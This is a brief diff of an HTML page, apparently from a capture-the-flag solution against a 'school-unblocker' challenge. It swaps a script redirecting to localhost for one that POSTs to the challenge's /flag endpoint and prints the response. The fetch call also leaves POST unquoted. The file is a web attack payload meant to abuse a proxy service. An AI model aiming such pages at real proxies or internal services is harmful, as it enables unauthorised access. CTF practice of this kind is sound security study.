@@ -4,6 +4,6 @@
   <title>Document</title>
 </head>
 <body>
-  <script>location.href='http://127.0.0.1:8080'</script>
+  <script>fetch('https://school-unblocker.web.actf.co/flag', {method: POST}).then(r=>r.text()).then(t=>console.log(t))</script>
 </body>
 </html>
